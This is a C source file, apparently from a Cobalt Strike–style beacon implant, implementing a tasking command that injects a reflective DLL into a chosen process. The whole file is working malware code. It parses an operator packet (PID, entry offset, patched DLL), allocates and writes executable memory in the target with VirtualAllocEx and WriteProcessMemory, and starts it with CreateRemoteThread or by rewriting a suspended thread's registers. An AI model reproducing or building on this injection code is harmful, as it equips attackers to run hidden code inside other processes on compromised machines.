#include "command.h"
#include "DllInject.h"
#include "Process.h"

VOID CmdDllInject(unsigned char* command, size_t command_length, BOOL x86) {
	// 数据包格式：injectPid(4 Bytes) || offset(4 Bytes) || patchDllContent(command_length - 8 Bytes)
	datap parser;
	BeaconDataParse(&parser, command, command_length);

	// 注入的 PID
	uint32_t injectPid = (uint32_t)BeaconDataInt(&parser);
	// Dll 执行 RDI 入口
	uint32_t offset = (uint32_t)BeaconDataInt(&parser);
	// patch 后的 Dll
	unsigned char* patchDllContent = BeaconDataPtr(&parser, command_length - 8);

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, injectPid);
	if (!hProcess) {
		fprintf(stderr, "OpenProcess failed with error:%lu\n", GetLastError());
		return;
	}

	if (x86 && is_x64_process(hProcess)) {
		fprintf(stderr, "32-bit shellcode cannot be injected into a 64-bit process\n");
		return;
	}
	if (!x86 && !is_x64_process(hProcess)) {
		fprintf(stderr, "64-bit shellcode cannot be injected into a 32-bit process\n");
		return;
	}

	size_t patchDllSize = command_length - 8;
	InjectProcessLogic(NULL, hProcess, injectPid, patchDllContent, patchDllSize, offset, NULL, 0);

	CloseHandle(hProcess);
}

VOID InjectProcessLogic(PROCESS_INFORMATION* pi, HANDLE hProcess, size_t injectPid, unsigned char* buffer, size_t length, uint32_t offset, void* parameter, int plen) {
	INJECTCONTEXT context;
	int field = 0;

	initializeInjectContext(&context, pi, hProcess, (DWORD)injectPid);

	// 参数分配
	unsigned char* argu = NULL;
	if (plen <= 0) {
		parameter = NULL;
	}
	else {
		argu = remoteAllocdata(&context, parameter, plen);
	}

	InjectProcess(&context, buffer, length, offset, argu);
}

VOID initializeInjectContext(INJECTCONTEXT* context, PROCESS_INFORMATION* pi, HANDLE hProcess, DWORD injectPid) {
	context->hProcess = hProcess;
	context->injectPid = injectPid;
	// targetArch 和 myArch 固定为 x64
	context->myArch = INJECT_ARCH_X64;
	context->targetArch = INJECT_ARCH_X64;
	context->sameArch = context->targetArch == context->myArch;
	context->samePid = injectPid == GetCurrentProcessId();

	if (pi != NULL) {
		context->isSuspended = TRUE;
		context->hThread = pi->hThread;
	}
	else {
		context->isSuspended = FALSE;
		context->hThread = NULL;
	}
}

VOID InjectProcess(INJECTCONTEXT* context, unsigned char* buffer, size_t length, size_t offset, void* parameter) {
	void* ptr = NULL;
	// 判断是否是本地进程 or 远程进程 然后在选择内存分配
	if (context->samePid) {
		ptr = localAllocdata(buffer, length);
	}
	else {
		ptr = remoteAllocdata(context, buffer, length);
	}

	if (context->isSuspended) {
		InjectViaResumethread(context->hThread, (LPVOID)((size_t)ptr + offset), parameter);
		return;
	}

	InjectProcessExecute(context, (unsigned char*)ptr, offset, parameter);
}

unsigned char* localAllocdata(unsigned char* buffer, size_t length) {
	// 内存页对齐
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	SIZE_T page = (SIZE_T)si.dwPageSize;
	SIZE_T allocsz = ((length + page - 1) / page) * page;

	// 检查溢出
	if (allocsz < length) { 
		fprintf(stderr, "alloc size overflow\n");
		return NULL;
	}

	void* ptr = VirtualAlloc(NULL, allocsz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (ptr == NULL) {
		fprintf(stderr, "VirtualAlloc failed with error:%lu\n", GetLastError());
		return NULL;
	}
	memcpy(ptr, buffer, length);

	if (allocsz > length) {
		SecureZeroMemory((unsigned char*)ptr + length, allocsz - length);
	}

	DWORD oldProtect = 0;
	if(!VirtualProtect(ptr, allocsz, PAGE_EXECUTE_READ, &oldProtect)) {
		fprintf(stderr, "VirtualAlloc (PAGE_EXECUTE_READ) failed with error:%lu\n", GetLastError());
		VirtualFree(ptr, 0, MEM_RELEASE);
		return NULL;
	}

	// 刷新指令缓存，确保 CPU 可以看到我们写入的指令
	if (!FlushInstructionCache(GetCurrentProcess(), ptr, allocsz)) {
		// 失败不一定致命，但记录
		fprintf(stderr, "FlushInstructionCache failed with error: %lu\n", GetLastError());
	}

	return (unsigned char*)ptr;
}

unsigned char* remoteAllocdata(INJECTCONTEXT* context, unsigned char* buffer, size_t length) {
	// 内存页对齐
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	size_t page = (size_t)si.dwPageSize;
	size_t allocsz = ((length + page - 1) / page) * page;

	// 检查溢出
	if (allocsz < length) {
		fprintf(stderr, "alloc size overflow\n");
		return NULL;
	}
	void* ptr = VirtualAllocEx(context->hProcess, NULL, allocsz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!ptr) {
		fprintf(stderr, "VirtualAllocEx failed with error:%lu\n", GetLastError());
		return NULL;
	}

	// 写入全部数据
	size_t actuallyWritten = 0;
	if (!WriteProcessMemory(context->hProcess, (BYTE*)ptr, buffer, length, &actuallyWritten)) {
		fprintf(stderr, "WriteProcessMemory failed with error: %lu\n", GetLastError());
		VirtualFreeEx(context->hProcess, ptr, 0, MEM_RELEASE);
		return NULL;
	}

	if (actuallyWritten != length) {
		fprintf(stderr, "WriteProcessMemory incomplete: %llu/%llu\n", (unsigned long long)actuallyWritten, (unsigned long long)length);
		VirtualFreeEx(context->hProcess, ptr, 0, MEM_RELEASE);
		return NULL;
	}

	DWORD oldProtect = 0;
	if (!VirtualProtectEx(context->hProcess, ptr, allocsz, PAGE_EXECUTE_READ, &oldProtect)) {
		fprintf(stderr, "VirtualProtectEx failed with error: %lu\n", GetLastError());
		VirtualFreeEx(context->hProcess, ptr, 0, MEM_RELEASE);
		return NULL;
	}

	// 刷新目标进程指令缓存
	if (!FlushInstructionCache(context->hProcess, ptr, allocsz)) {
		// 记录但不一定致命 
		fprintf(stderr, "FlushInstructionCache failed with error: %lu\n", GetLastError());
	}

	return (unsigned char*)ptr;
}

VOID InjectProcessExecute(INJECTCONTEXT* context, unsigned char* ptr, size_t offset, void* parameter) {
	// 如果是本地进程使用 CreateThread
	if (context->samePid) {
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ptr + offset), parameter, 0, NULL);
		if (!hThread) {
			fprintf(stderr, "CreateThread failed with error:%lu\n", GetLastError());
			return;
		}
		CloseHandle(hThread);
	}
	// 如果是远程进程使用 CreateRemoteThread
	else {
		HANDLE hThread = CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(ptr + offset), parameter, 0, NULL);
		if (!hThread) {
			fprintf(stderr, "CreateRemoteThread failed with error:%lu\n", GetLastError());
			return;
		}
		CloseHandle(hThread);
	}
}

VOID InjectViaResumethread(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter) {
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(hThread, &ctx)) {
		fprintf(stderr, "GetThreadContext failed with error:%lu\n", GetLastError());
		return;
	} 

	ctx.Rcx = (DWORD64)lpStartAddress;
	ctx.Rdx = (DWORD64)lpParameter;

	if (!SetThreadContext(hThread, &ctx)) {
		fprintf(stderr, "SetThreadContext failed with error:%lu\n", GetLastError());
		return;
	}

	ResumeThread(hThread);
}
